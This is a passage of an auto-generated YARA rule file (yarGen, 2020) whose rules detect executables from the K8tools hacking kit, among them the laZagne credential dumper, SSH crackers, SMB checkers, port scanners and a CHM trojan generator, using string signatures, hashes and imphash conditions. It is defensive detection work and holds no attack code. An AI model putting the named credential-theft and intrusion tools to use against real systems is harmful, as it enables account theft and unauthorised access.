      $s1 = "Failed to get address for PyImport_ExecCodeModule" fullword ascii /* score: '27.00'*/
      $s2 = "Failed to get address for Py_NoUserSiteDirectory" fullword ascii /* score: '23.00'*/
      $s3 = "Failed to get executable path." fullword ascii /* score: '20.00'*/
      $s4 = "Failed to get address for PyRun_SimpleString" fullword ascii /* score: '18.00'*/
      $s5 = "Failed to get address for PyMarshal_ReadObjectFromString" fullword ascii /* score: '18.00'*/
      $s6 = "Failed to get address for Py_FileSystemDefaultEncoding" fullword ascii /* score: '18.00'*/
      $s7 = "Failed to get address for PyUnicode_DecodeFSDefault" fullword ascii /* score: '17.00'*/
      $s8 = "Failed to get address for PyUnicode_Decode" fullword ascii /* score: '17.00'*/
      $s9 = "Error loading Python DLL '%s'." fullword ascii /* score: '15.00'*/
      $s10 = "Failed to convert executable path to UTF-8." fullword ascii /* score: '15.00'*/
      $s11 = "Failed to get address for PyString_FromString" fullword ascii /* score: '15.00'*/
      $s12 = "Failed to get address for PySys_SetObject" fullword ascii /* score: '15.00'*/
      $s13 = "Failed to get address for PyErr_Occurred" fullword ascii /* score: '15.00'*/
      $s14 = "Failed to get address for PySys_GetObject" fullword ascii /* score: '15.00'*/
      $s15 = "Failed to get address for PyImport_AddModule" fullword ascii /* score: '15.00'*/
      $s16 = "Failed to get address for PyString_FromFormat" fullword ascii /* score: '15.00'*/
      $s17 = "Failed to get address for Py_IncRef" fullword ascii /* score: '15.00'*/
      $s18 = "Failed to get address for Py_SetPythonHome" fullword ascii /* score: '15.00'*/
      $s19 = "Failed to get address for Py_GetPath" fullword ascii /* score: '15.00'*/
      $s20 = "Failed to get address for Py_DecRef" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 28000KB and ( 8 of them )
      ) or ( all of them )
}

rule _sshcrack_sshcmd_smbcheck_8 {
   meta:
      description = "K8tools - from files sshcrack.exe, sshcmd.exe, smbcheck.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "4a023e1b9ff0a1ac7df76764e708770eacc50a76efa38f7d339ecc0c72daccd9"
      hash2 = "4aa373d8f124c0f1143d6cb8e339e518a6fb058433aa46c1868900d093dc1dcd"
      hash3 = "767d4a583547d7d6da8fb5aa8602c33816908e90768a05696d311b497d57250b"
   strings:
      $s1 = "pyasn1.codec.der.encoder(" fullword ascii /* score: '10.00'*/
      $s2 = "pyasn1.codec.ber.encoder(" fullword ascii /* score: '10.00'*/
      $s3 = "pyasn1.codec.cer.encoder(" fullword ascii /* score: '10.00'*/
      $s4 = "!isok9 -" fullword ascii /* score: '8.00'*/
      $s5 = "!s9r* " fullword ascii /* score: '5.42'*/
      $s6 = "# Ww_/" fullword ascii /* score: '5.00'*/
      $s7 = "LlTNnV2" fullword ascii /* score: '5.00'*/
      $s8 = "rsexni" fullword ascii /* score: '5.00'*/
      $s9 = "}Xmdyf\"@s<" fullword ascii /* score: '4.42'*/
      $s10 = "JVro-=I3rd&" fullword ascii /* score: '4.42'*/
      $s11 = "wnswAa]s" fullword ascii /* score: '4.00'*/
      $s12 = "/.Dkw<" fullword ascii /* score: '4.00'*/
      $s13 = "|3xzTfGerT" fullword ascii /* score: '4.00'*/
      $s14 = "SVZQa5w" fullword ascii /* score: '4.00'*/
      $s15 = "MDBdEET" fullword ascii /* score: '4.00'*/
      $s16 = "KwHwJwIK" fullword ascii /* score: '4.00'*/
      $s17 = "FXVErNP" fullword ascii /* score: '4.00'*/
      $s18 = "CUflG+Z" fullword ascii /* score: '4.00'*/
      $s19 = "0D.Fol" fullword ascii /* score: '4.00'*/
      $s20 = "%YBKw/+w" fullword ascii /* score: '4.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 28000KB and ( 8 of them )
      ) or ( all of them )
}

rule _laZagne_web_K8PortScan_9 {
   meta:
      description = "K8tools - from files laZagne.exe, web.exe, K8PortScan.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "1f58bef31a99631a59437a93db2307a3f84b83221829a9851f355e401c74f0e6"
      hash2 = "480638e653075f5c4326a228dd34e83dbfbb296c03367e1a3157e08ddf907e35"
      hash3 = "43feb173eea41cddec443266f5abadccabe9fb02e47868f1d737ce4f2347690e"
   strings:
      $s1 = "soporoqos" fullword ascii /* score: '8.00'*/
      $s2 = "@X(\\(\\$\\,\\\"\\*\\&\\.\\!\\)\\%\\-\\#\\+\\'\\/" fullword ascii /* score: '6.00'*/
      $s3 = "- yR+%-" fullword ascii /* score: '5.00'*/
      $s4 = "$GH] -" fullword ascii /* score: '5.00'*/
      $s5 = "C+ k\"W?" fullword ascii /* score: '5.00'*/
      $s6 = "NUchZM3" fullword ascii /* score: '5.00'*/
      $s7 = "dk.n%k%f" fullword ascii /* score: '5.00'*/
      $s8 = "!k /C^" fullword ascii /* score: '5.00'*/
      $s9 = "QOxT z'cL>nNd" fullword ascii /* score: '4.00'*/
      $s10 = ",\\&~m}" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s11 = "lIdK [" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s12 = "zEdc+4" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s13 = "6l,x0U" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s14 = "coh;E]Z!" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s15 = "2tAP+6" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s16 = "Dc6<Eh |" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s17 = "H@VV89" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s18 = "Uz^X38" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s19 = "mCnt}=" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s20 = "gn06`&" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 26000KB and ( 8 of them )
      ) or ( all of them )
}

rule _K8________________K8PortMap_ms16135______________________10 {
   meta:
      description = "K8tools - from files K8注册表跳转.exe, K8PortMap.exe, ms16135完美版提权演示.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "79287d5264d81bc40b9474faf0cce368e300eaf7efe0ddfea6e74f3b2321c930"
      hash2 = "ab54a346f9ab48b983583d14ff7f616789f4cf471c51ae216008488fc426c653"
      hash3 = "03739d26b0ea5fe70fb7a925a600d4d9c0890a29dd1ba9c18388cc9c3399a3ba"
   strings:
      $s1 = "TFiler" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.95'*/ /* Goodware String - occured 48 times */
      $s2 = "Sender" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.81'*/ /* Goodware String - occured 194 times */
      $s3 = "Target" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.58'*/ /* Goodware String - occured 415 times */
      $s4 = "3333f3333333" ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s5 = "1234567890ABCDEF" ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s6 = "Forms0" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s7 = "333DDD33333" ascii /* score: '1.00'*/
      $s8 = "Error creating window class+Cannot focus a disabled or invisible window!Control '%s' has no parent window" fullword wide /* score: '0.00'*/ /* Goodware String - occured 5 times */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 9000KB and ( all of them )
      ) or ( all of them )
}

rule _laZagne_sshcrack_sshcmd_smbcheck_11 {
   meta:
      description = "K8tools - from files laZagne.exe, sshcrack.exe, sshcmd.exe, smbcheck.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "1f58bef31a99631a59437a93db2307a3f84b83221829a9851f355e401c74f0e6"
      hash2 = "4a023e1b9ff0a1ac7df76764e708770eacc50a76efa38f7d339ecc0c72daccd9"
      hash3 = "4aa373d8f124c0f1143d6cb8e339e518a6fb058433aa46c1868900d093dc1dcd"
      hash4 = "767d4a583547d7d6da8fb5aa8602c33816908e90768a05696d311b497d57250b"
   strings:
      $s1 = "pyasn1.compat.string(" fullword ascii /* score: '14.00'*/
      $s2 = "pyasn1.compat(" fullword ascii /* score: '14.00'*/
      $s3 = "pyasn1.compat.dateandtime(" fullword ascii /* score: '14.00'*/
      $s4 = "pyasn1.compat.integer(" fullword ascii /* score: '14.00'*/
      $s5 = "pyasn1.compat.binary(" fullword ascii /* score: '14.00'*/
      $s6 = "pyasn1.compat.octets(" fullword ascii /* score: '14.00'*/
      $s7 = "pyasn1.codec.der.decoder(" fullword ascii /* score: '12.00'*/
      $s8 = "pyasn1.codec.cer.decoder(" fullword ascii /* score: '12.00'*/
      $s9 = "pyasn1.codec.ber.decoder(" fullword ascii /* score: '12.00'*/
      $s10 = "pyasn1.type.tag(" fullword ascii /* score: '10.00'*/
      $s11 = "pyasn1.type.error(" fullword ascii /* score: '10.00'*/
      $s12 = "pyasn1.codec.ber.eoo(" fullword ascii /* score: '10.00'*/
      $s13 = "pyasn1.codec.ber(" fullword ascii /* score: '10.00'*/
      $s14 = "pyasn1.codec.der(" fullword ascii /* score: '10.00'*/
      $s15 = "pyasn1.error(" fullword ascii /* score: '10.00'*/
      $s16 = "pyasn1.codec.cer(" fullword ascii /* score: '10.00'*/
      $s17 = "pyasn1.compat.calling(" fullword ascii /* score: '10.00'*/
      $s18 = "pyasn1.type.char(" fullword ascii /* score: '7.00'*/
      $s19 = "pyasn1.type.namedval(" fullword ascii /* score: '7.00'*/
      $s20 = "pyasn1.type.tagmap(" fullword ascii /* score: '7.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 28000KB and ( 8 of them )
      ) or ( all of them )
}

rule _laZagne_smbcheck_12 {
   meta:
      description = "K8tools - from files laZagne.exe, smbcheck.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "1f58bef31a99631a59437a93db2307a3f84b83221829a9851f355e401c74f0e6"
      hash2 = "767d4a583547d7d6da8fb5aa8602c33816908e90768a05696d311b497d57250b"
   strings:
      $s1 = "Crypto.PublicKey(" fullword ascii /* score: '13.00'*/
      $s2 = "Crypto.Hash.SHA(" fullword ascii /* score: '13.00'*/
      $s3 = "bCrypto.Hash._SHA256.pyd" fullword ascii /* score: '13.00'*/
      $s4 = "bCrypto.Cipher._ARC4.pyd" fullword ascii /* score: '10.42'*/
      $s5 = "bCrypto.Cipher._DES3.pyd" fullword ascii /* score: '10.42'*/
      $s6 = "bCrypto.Cipher._DES.pyd" fullword ascii /* score: '10.00'*/
      $s7 = "bCrypto.Cipher._AES.pyd" fullword ascii /* score: '10.00'*/
      $s8 = "Crypto.Hash(" fullword ascii /* score: '10.00'*/
      $s9 = "Crypto.Util.py21compat(" fullword ascii /* score: '10.00'*/
      $s10 = "Crypto.Cipher.DES(" fullword ascii /* score: '10.00'*/
      $s11 = "Crypto.Util.py3compat(" fullword ascii /* score: '10.00'*/
      $s12 = "Crypto.Cipher.AES(" fullword ascii /* score: '10.00'*/
      $s13 = "Crypto.Protocol.KDF(" fullword ascii /* score: '10.00'*/
      $s14 = "bCrypto.Random.OSRNG.winrandom.pyd" fullword ascii /* score: '10.00'*/
      $s15 = "bCrypto.Util._counter.pyd" fullword ascii /* score: '10.00'*/
      $s16 = "Crypto.Hash.HMAC(" fullword ascii /* score: '10.00'*/
      $s17 = "Crypto.Hash.MD5(" fullword ascii /* score: '10.00'*/
      $s18 = "Crypto.Hash.hashalgo(" fullword ascii /* score: '10.00'*/
      $s19 = "Crypto.Hash.SHA256(" fullword ascii /* score: '10.00'*/
      $s20 = "Crypto.Random._UserFriendlyRNG(" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 26000KB and pe.imphash() == "fc40519af20116c903e3ff836e366e39" and ( 8 of them )
      ) or ( all of them )
}

rule _K8________________K8PortMap_13 {
   meta:
      description = "K8tools - from files K8注册表跳转.exe, K8PortMap.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "79287d5264d81bc40b9474faf0cce368e300eaf7efe0ddfea6e74f3b2321c930"
      hash2 = "ab54a346f9ab48b983583d14ff7f616789f4cf471c51ae216008488fc426c653"
   strings:
      $s1 = "UrlMon" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.97'*/ /* Goodware String - occured 30 times */
      $s2 = "Background" fullword wide /* PEStudio Blacklist: strings */ /* score: '4.85'*/ /* Goodware String - occured 153 times */
      $s3 = "~D_^[Y]" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s4 = "Icon image is not valid!Cannot change the size of an icon" fullword wide /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s5 = "6$6,6064686<6@6D6H6L6\\6|6" fullword ascii /* score: '1.42'*/
      $s6 = ":GauOFKu" fullword ascii /* score: '1.00'*/ /* Goodware String - occured 4 times */
      $s7 = "No help found for %s#No context-sensitive help installed$No topic-based help system installed" fullword wide /* score: '1.00'*/ /* Goodware String - occured 4 times */
      $s8 = ";B0uGj" fullword ascii /* score: '1.00'*/ /* Goodware String - occured 4 times */
      $s9 = ";X0t@S" fullword ascii /* score: '1.00'*/ /* Goodware String - occured 4 times */
      $s10 = "JumpID(\"\",\"%s\")" fullword ascii /* score: '0.00'*/ /* Goodware String - occured 5 times */
      $s11 = "u$;~|u" fullword ascii /* score: '0.00'*/ /* Goodware String - occured 5 times */
      $s12 = "R ;C0|" fullword ascii /* score: '0.00'*/ /* Goodware String - occured 5 times */
      $s13 = "t;s0t" fullword ascii /* score: '0.00'*/ /* Goodware String - occured 5 times */
      $s14 = "$:Cjt_" fullword ascii /* score: '0.00'*/ /* Goodware String - occured 5 times */
      $s15 = "TWinHelpViewer" fullword ascii /* score: '0.00'*/ /* Goodware String - occured 5 times */
      $s16 = "u*;~8u" fullword ascii /* score: '0.00'*/ /* Goodware String - occured 5 times */
      $s17 = "R,;C4}!" fullword ascii /* score: '0.00'*/ /* Goodware String - occured 5 times */
      $s18 = "StdCtrls&" fullword ascii /* score: '0.00'*/ /* Goodware String - occured 5 times */
      $s19 = "IE(AL(\"%s\",4),\"AL(\\\"%0:s\\\",3)\",\"JK(\\\"%1:s\\\",\\\"%0:s\\\")\")" fullword ascii /* score: '0.00'*/ /* Goodware String - occured 5 times */
      $s20 = "f;sDtsf" fullword ascii /* score: '0.00'*/ /* Goodware String - occured 5 times */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _laZagne_ScRunBase32_sshcrack_web_K8PortScan_ScRunBase64_scrun_sshcmd_smbcheck_K8PortScan_Kali_x86_14 {
   meta:
      description = "K8tools - from files laZagne.exe, ScRunBase32.exe, sshcrack.exe, web.exe, K8PortScan.exe, ScRunBase64.exe, scrun.exe, sshcmd.exe, smbcheck.exe, K8PortScan_Kali_x86"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "1f58bef31a99631a59437a93db2307a3f84b83221829a9851f355e401c74f0e6"
      hash2 = "6973d802aef27a76a07067858ff47999e67ef02879786608bedc4f1b0508ac30"
      hash3 = "4a023e1b9ff0a1ac7df76764e708770eacc50a76efa38f7d339ecc0c72daccd9"
      hash4 = "480638e653075f5c4326a228dd34e83dbfbb296c03367e1a3157e08ddf907e35"
      hash5 = "43feb173eea41cddec443266f5abadccabe9fb02e47868f1d737ce4f2347690e"
      hash6 = "de72bfa9415cda80d9ee956c784bea7760c72e041bbdbeefe2f6ad44ab920273"
      hash7 = "406fa2253f7568e45639a0e0391949d66637f412b91c0dab6eaad5b97d30c0b2"
      hash8 = "4aa373d8f124c0f1143d6cb8e339e518a6fb058433aa46c1868900d093dc1dcd"
      hash9 = "767d4a583547d7d6da8fb5aa8602c33816908e90768a05696d311b497d57250b"
      hash10 = "0c15a74440d9fee10428f2b1882099586437ce460473bd71c4cacc5d108cbfe4"
   strings:
      $s1 = "Failed to execute script %s" fullword ascii /* score: '20.00'*/
      $s2 = "Failed to get _MEIPASS as PyObject." fullword ascii /* score: '15.00'*/
      $s3 = "Installing PYZ: Could not get sys.path" fullword ascii /* score: '11.00'*/
      $s4 = "pyi-runtime-tmpdir" fullword ascii /* score: '10.00'*/
      $s5 = "Failed to convert Wflag %s using mbstowcs (invalid multibyte string)" fullword ascii /* score: '10.00'*/
      $s6 = "Could not get __main__ module." fullword ascii /* score: '9.00'*/
      $s7 = "Could not get __main__ module's dict." fullword ascii /* score: '9.00'*/
      $s8 = "* +4\"N" fullword ascii /* score: '9.00'*/
      $s9 = "spyiboot01_bootstrap" fullword ascii /* score: '9.00'*/
      $s10 = "Error copying %s" fullword ascii /* score: '7.00'*/
      $s11 = "Error opening archive %s" fullword ascii /* score: '7.00'*/
      $s12 = "Failed to convert progname to wchar_t" fullword ascii /* score: '7.00'*/
      $s13 = "Failed to convert argv to wchar_t" fullword ascii /* score: '7.00'*/
      $s14 = "Failed to append to sys.path" fullword ascii /* score: '7.00'*/
      $s15 = "Failed to convert pyhome to wchar_t" fullword ascii /* score: '7.00'*/
      $s16 = "Failed to convert pypath to wchar_t" fullword ascii /* score: '7.00'*/
      $s17 = "Failed to unmarshal code object for %s" fullword ascii /* score: '7.00'*/
      $s18 = "mpyimod03_importers" fullword ascii /* score: '7.00'*/
      $s19 = "Failed to write all bytes for %s" fullword ascii /* score: '7.00'*/
      $s20 = "_MEIPASS" fullword ascii /* score: '7.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x457f ) and filesize < 28000KB and ( 8 of them )
      ) or ( all of them )
}

rule _laZagne_sshcrack_web_sshcmd_smbcheck_15 {
   meta:
      description = "K8tools - from files laZagne.exe, sshcrack.exe, web.exe, sshcmd.exe, smbcheck.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "1f58bef31a99631a59437a93db2307a3f84b83221829a9851f355e401c74f0e6"
      hash2 = "4a023e1b9ff0a1ac7df76764e708770eacc50a76efa38f7d339ecc0c72daccd9"
      hash3 = "480638e653075f5c4326a228dd34e83dbfbb296c03367e1a3157e08ddf907e35"
      hash4 = "4aa373d8f124c0f1143d6cb8e339e518a6fb058433aa46c1868900d093dc1dcd"
      hash5 = "767d4a583547d7d6da8fb5aa8602c33816908e90768a05696d311b497d57250b"
   strings:
      $s1 = "hZFtPC" fullword ascii /* score: '6.00'*/
      $s2 = "U%vhS%" fullword ascii /* score: '5.00'*/
      $s3 = "f^* 2t_" fullword ascii /* score: '5.00'*/
      $s4 = "hQU-IJpyr>Z" fullword ascii /* score: '4.00'*/
      $s5 = "mimetypes(" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s6 = "email(" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s7 = "ftplib(" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s8 = ".DVa;e3" fullword ascii /* score: '4.00'*/
      $s9 = "email._parseaddr(" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s10 = "email.generator(" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s11 = "email.encoders(" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s12 = "getpass(" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s13 = "pVsi)\"U" fullword ascii /* score: '4.00'*/
      $s14 = "ZQLK3$z" fullword ascii /* score: '4.00'*/
      $s15 = "email.iterators(" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s16 = "STCd`hL" fullword ascii /* score: '4.00'*/
      $s17 = "mimetools(" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s18 = "email.header(" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s19 = "httplib(" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s20 = "email.utils(" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 28000KB and ( 8 of them )
      ) or ( all of them )
}

rule _sshcrack_sshcmd_K8PortScan_Kali_x86_16 {
   meta:
      description = "K8tools - from files sshcrack.exe, sshcmd.exe, K8PortScan_Kali_x86"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "4a023e1b9ff0a1ac7df76764e708770eacc50a76efa38f7d339ecc0c72daccd9"
      hash2 = "4aa373d8f124c0f1143d6cb8e339e518a6fb058433aa46c1868900d093dc1dcd"
      hash3 = "0c15a74440d9fee10428f2b1882099586437ce460473bd71c4cacc5d108cbfe4"
   strings:
      $s1 = "nq:\\_Wc4" fullword ascii /* score: '7.00'*/
      $s2 = "4moR- " fullword ascii /* score: '5.42'*/
      $s3 = "iIRN|EK" fullword ascii /* score: '4.00'*/
      $s4 = "QqDm,9=" fullword ascii /* score: '4.00'*/
      $s5 = "xOaO1I\\" fullword ascii /* score: '4.00'*/
      $s6 = "aUrpc\"" fullword ascii /* score: '4.00'*/
      $s7 = "cpjA1eH" fullword ascii /* score: '4.00'*/
      $s8 = "rIZNe~u" fullword ascii /* score: '4.00'*/
      $s9 = "KGHAs\\" fullword ascii /* score: '4.00'*/
      $s10 = "fjeclPb" fullword ascii /* score: '4.00'*/
      $s11 = "\"Hgtl/OJ" fullword ascii /* score: '4.00'*/
      $s12 = "SdkyBRi" fullword ascii /* score: '4.00'*/
      $s13 = "zcXV0!s" fullword ascii /* score: '4.00'*/
      $s14 = "CsVqx2;" fullword ascii /* score: '4.00'*/
      $s15 = "Vfhp68{" fullword ascii /* score: '4.00'*/
      $s16 = "\\?R:ry" fullword ascii /* score: '2.00'*/
      $s17 = "qrLAh8" fullword ascii /* score: '2.00'*/
      $s18 = "uJCC97" fullword ascii /* score: '2.00'*/
      $s19 = "y7@e bE" fullword ascii /* score: '1.00'*/
      $s20 = "Et S0F" fullword ascii /* score: '1.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x457f ) and filesize < 28000KB and pe.imphash() == "4df47bd79d7fe79953651a03293f0e8f" and ( 8 of them )
      ) or ( all of them )
}

rule _laZagne_ScRunBase32_sshcrack_web_K8PortScan_Suse10_x64_K8PortScan_ScRunBase64_scrun_sshcmd_smbcheck_K8PortScan_Kali_x86_17 {
   meta:
      description = "K8tools - from files laZagne.exe, ScRunBase32.exe, sshcrack.exe, web.exe, K8PortScan_Suse10_x64, K8PortScan.exe, ScRunBase64.exe, scrun.exe, sshcmd.exe, smbcheck.exe, K8PortScan_Kali_x86"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "1f58bef31a99631a59437a93db2307a3f84b83221829a9851f355e401c74f0e6"
      hash2 = "6973d802aef27a76a07067858ff47999e67ef02879786608bedc4f1b0508ac30"
      hash3 = "4a023e1b9ff0a1ac7df76764e708770eacc50a76efa38f7d339ecc0c72daccd9"
      hash4 = "480638e653075f5c4326a228dd34e83dbfbb296c03367e1a3157e08ddf907e35"
      hash5 = "b9df9b1eafdcc6c6440d4d924ac09262e736c94d22601722c7994bf12031f4a6"
      hash6 = "43feb173eea41cddec443266f5abadccabe9fb02e47868f1d737ce4f2347690e"
      hash7 = "de72bfa9415cda80d9ee956c784bea7760c72e041bbdbeefe2f6ad44ab920273"
      hash8 = "406fa2253f7568e45639a0e0391949d66637f412b91c0dab6eaad5b97d30c0b2"
      hash9 = "4aa373d8f124c0f1143d6cb8e339e518a6fb058433aa46c1868900d093dc1dcd"
      hash10 = "767d4a583547d7d6da8fb5aa8602c33816908e90768a05696d311b497d57250b"
      hash11 = "0c15a74440d9fee10428f2b1882099586437ce460473bd71c4cacc5d108cbfe4"
   strings:
      $s1 = "D& dd{" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s2 = "Cannot open self %s or archive %s" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s3 = "encodings.cp932(" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s4 = "encodings.cp037(" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s5 = "encodings.hex_codec(" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s6 = "encodings.euc_jis_2004(" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s7 = "sre_compile(" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s8 = "encodings.base64_codec(" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s9 = "encodings.gbk(" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s10 = "encodings.gb18030(" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s11 = "os2emxpath(" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s12 = "encodings.cp1256(" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s13 = "calendar(" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s14 = "encodings.shift_jis_2004(" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s15 = "encodings.utf_32(" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s16 = "fnmatch(" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s17 = "encodings.mac_turkish(" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s18 = "encodings.utf_7(" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s19 = "encodings.iso2022_jp(" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s20 = "encodings.cp865(" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x457f ) and filesize < 28000KB and ( 8 of them )
      ) or ( all of them )
}

rule _CHM________________K8_________________________18 {
   meta:
      description = "K8tools - from files CHM网马生成器.exe, K8个性桌面右键菜单.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "ee973cef02c1d258eba2e892a47e91c62d54fbf3670ffc6bbea716ccc860f45d"
      hash2 = "0a00a2a7057c1ef02c4f2ab6144a9ad2a3699e2d850ad0fafde8f61c34228ec6"
   strings:
      $x1 = "msvbvm60.dll" fullword ascii /* reversed goodware string 'lld.06mvbvsm' */ /* score: '33.00'*/
      $s2 = "pGet/?" fullword ascii /* score: '6.00'*/
      $s3 = "netapi" fullword ascii /* score: '5.00'*/
      $s4 = "bcdfgh" fullword ascii /* score: '5.00'*/
      $s5 = "BCDEFW " fullword ascii /* score: '4.42'*/
      $s6 = "zB|J~RxZzb|j~r~z" fullword ascii /* score: '4.00'*/
      $s7 = "Umar;J`" fullword ascii /* score: '4.00'*/
      $s8 = "Strin5gXu" fullword ascii /* score: '4.00'*/
      $s9 = "QWRVvDs" fullword ascii /* score: '4.00'*/
      $s10 = "TModeInv" fullword ascii /* score: '4.00'*/
      $s11 = "rBtJvRxZzb" fullword ascii /* score: '4.00'*/
      $s12 = "[CmjUAx/" fullword ascii /* score: '4.00'*/
      $s13 = "nOiNT(@^" fullword ascii /* score: '4.00'*/
      $s14 = "RCPTr`/O:ep" fullword ascii /* score: '4.00'*/
      $s15 = "rLtPvTxbzj|r~z~" fullword ascii /* score: '4.00'*/
      $s16 = "orla<n`<De" fullword ascii /* score: '4.00'*/
      $s17 = "hjYZuSt" fullword ascii /* score: '4.00'*/
      $s18 = "rBtJvRxZzb|j~r~z~" fullword ascii /* score: '4.00'*/
      $s19 = "rBtlvux" fullword ascii /* score: '4.00'*/
      $s20 = "ouwi q" fullword ascii /* score: '3.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "cc880652726afd2f3a057fff96e83c4e" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _laZagne_sshcrack_web_sshcmd_19 {
   meta:
      description = "K8tools - from files laZagne.exe, sshcrack.exe, web.exe, sshcmd.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "1f58bef31a99631a59437a93db2307a3f84b83221829a9851f355e401c74f0e6"
      hash2 = "4a023e1b9ff0a1ac7df76764e708770eacc50a76efa38f7d339ecc0c72daccd9"
      hash3 = "480638e653075f5c4326a228dd34e83dbfbb296c03367e1a3157e08ddf907e35"
      hash4 = "4aa373d8f124c0f1143d6cb8e339e518a6fb058433aa46c1868900d093dc1dcd"
   strings:
      $s1 = "xInclude\\pyconfig.h" fullword ascii /* score: '7.00'*/
      $s2 = "distutils.debug(" fullword ascii /* score: '7.00'*/
      $s3 = "dummy_threading(" fullword ascii /* score: '7.00'*/
      $s4 = "!(#g- " fullword ascii /* score: '5.42'*/
      $s5 = "SiGD9=vIq9" fullword ascii /* score: '4.00'*/
      $s6 = "axhfh)0" fullword ascii /* score: '4.00'*/
      $s7 = "distutils.text_file(" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s8 = "d.Jjs;" fullword ascii /* score: '4.00'*/
